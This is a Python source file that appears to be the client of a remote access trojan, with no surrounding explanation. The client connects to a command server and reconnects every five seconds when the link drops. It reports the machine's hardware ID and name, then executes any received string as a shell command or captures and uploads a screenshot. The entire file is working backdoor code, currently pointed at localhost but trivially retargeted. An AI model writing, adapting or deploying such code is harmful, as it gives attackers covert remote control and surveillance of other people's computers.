import asyncio
import platform
import uuid
import subprocess
import json
import pyautogui
import os
import getpass

def get_hwid():
    if platform.system() == "Windows":
        command = "wmic csproduct get UUID"
        try:
            hwid = subprocess.check_output(command, shell=True).decode().split('\n')[1].strip()
            return hwid
        except Exception as e:
            return f"Error: {str(e)}"
    else:
        return str(uuid.getnode())

async def client_program():
    host = '127.0.0.1'
    port = 9999

    while True:
        try:
            reader, writer = await asyncio.open_connection(host, port)

            hwid = get_hwid()
            pc_name = platform.node()
            client_info = json.dumps({'hwid': hwid, 'pc_name': pc_name})
            writer.write(client_info.encode())
            await writer.drain()

            while True:
                data = await reader.read(1024)
                if not data:
                    break
                command = data.decode()
                if command == "take_screenshot":
                    user = getpass.getuser()
                    temp_dir = f"C:\\Users\\{user}\\AppData\\Local\\Temp"
                    screenshot_path = os.path.join(temp_dir, f"screenshot_{hwid}.png")
                    pyautogui.screenshot(screenshot_path)
                    with open(screenshot_path, 'rb') as f:
                        screenshot_data = f.read()
                    writer.write(len(screenshot_data).to_bytes(8, byteorder='big'))
                    await writer.drain()
                    writer.write(screenshot_data)
                    await writer.drain()
                    os.remove(screenshot_path)
                else:
                    try:
                        result = subprocess.check_output(command, shell=True).decode()
                    except subprocess.CalledProcessError as e:
                        result = f"Error executing command: {e.output.decode()}"
                    except Exception as e:
                        result = f"Error: {str(e)}"
                    writer.write(result.encode())
                    await writer.drain()

            writer.close()
            await writer.wait_closed()
        except Exception as e:
            print(f"Unexpected error: {str(e)}")
            await asyncio.sleep(5)

if __name__ == '__main__':
    asyncio.run(client_program())